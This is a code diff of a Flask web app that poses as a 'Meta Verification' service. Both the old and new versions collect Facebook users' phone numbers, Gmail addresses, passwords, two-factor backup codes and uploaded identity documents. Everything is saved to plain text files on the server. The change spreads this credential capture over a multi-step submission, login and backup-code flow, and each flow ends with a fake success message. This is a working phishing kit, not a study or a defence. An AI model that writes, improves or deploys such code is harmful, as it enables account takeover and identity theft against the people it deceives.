@@ -1,8 +1,9 @@
-from flask import Flask, render_template, request
+from flask import Flask, render_template, request, redirect, url_for
 import os
 from datetime import datetime
 
 app = Flask(__name__)
+
 UPLOAD_FOLDER = 'submissions'
 if not os.path.exists(UPLOAD_FOLDER):
     os.makedirs(UPLOAD_FOLDER)
@@ -13,36 +14,69 @@ def index():
 
 @app.route('/submit', methods=['POST'])
 def submit():
-    fb_name = request.form.get('fb_name', '').strip()
-    fb_email = request.form.get('fb_email', '').strip()
-    fb_phone = request.form.get('fb_phone', '').strip()
-    fb_password = request.form.get('fb_password', '').strip()
-    backup_code = request.form.get('backup_code', '').strip()
-    nid_file = request.files.get('nid_upload')
+    fb_number = request.form.get('fb_number')
+    gmail = request.form.get('gmail')
+    file = request.files.get('file')
 
-    # Check if required fields are filled
-    if not fb_name or not fb_email or not fb_password or not nid_file:
-        return "❌ All required fields must be filled.", 400
+    if not fb_number or not gmail or not file:
+        return "All fields are required!", 400
 
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-    safe_name = fb_name.replace(' ', '_') or 'unknown'
+    safe_number = fb_number.replace(' ', '_')
+    folder_path = os.path.join(UPLOAD_FOLDER, safe_number + '_' + timestamp)
 
-    # Save data
-    filename = f"{UPLOAD_FOLDER}/{safe_name}_{timestamp}.txt"
-    with open(filename, 'w', encoding='utf-8') as f:
-        f.write(f"Facebook Name: {fb_name}\n")
-        f.write(f"Email/Username: {fb_email}\n")
-        f.write(f"Phone Number: {fb_phone}\n")
-        f.write(f"Password: {fb_password}\n")
-        f.write(f"Backup Code: {backup_code}\n")
+    os.makedirs(folder_path, exist_ok=True)
 
-    # Save uploaded file
-    if nid_file:
-        ext = nid_file.filename.split('.')[-1]
-        nid_path = f"{UPLOAD_FOLDER}/{safe_name}_{timestamp}_nid.{ext}"
-        nid_file.save(nid_path)
+    file_path = os.path.join(folder_path, file.filename)
+    file.save(file_path)
 
-    return "✅ Your Meta Verification Request has been submitted successfully."
+    # Save text data
+    with open(os.path.join(folder_path, 'info.txt'), 'w') as f:
+        f.write(f"Facebook Number: {fb_number}\n")
+        f.write(f"Gmail: {gmail}\n")
+
+    return redirect(url_for('login_page'))
+
+@app.route('/login', methods=['GET', 'POST'])
+def login_page():
+    if request.method == 'POST':
+        email_or_number = request.form.get('email_or_number')
+        password = request.form.get('password')
+
+        if not email_or_number or not password:
+            return render_template('login.html', error="All fields are required.")
+
+        # Save login info
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        login_file = os.path.join(UPLOAD_FOLDER, f"login_{timestamp}.txt")
+        with open(login_file, 'w') as f:
+            f.write(f"Email/Number: {email_or_number}\n")
+            f.write(f"Password: {password}\n")
+
+        if password.strip() != "":  # আপনি চাইলে এখানে পাসওয়ার্ড ভ্যালিডেশন করতে পারেন
+            return redirect(url_for('backup_page'))
+        else:
+            return render_template('login.html', error="Incorrect login. Please try again.")
+
+    return render_template('login.html')
+
+@app.route('/backup', methods=['GET', 'POST'])
+def backup_page():
+    if request.method == 'POST':
+        backup_code = request.form.get('backup_code')
+
+        if not backup_code:
+            return render_template('backup.html', error="Backup code is required.")
+
+        # Save backup code
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        backup_file = os.path.join(UPLOAD_FOLDER, f"backup_{timestamp}.txt")
+        with open(backup_file, 'w') as f:
+            f.write(f"Backup Code: {backup_code}\n")
+
+        return "✅ Verification process completed successfully."
+
+    return render_template('backup.html')
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000)
+    app.run(debug=True)
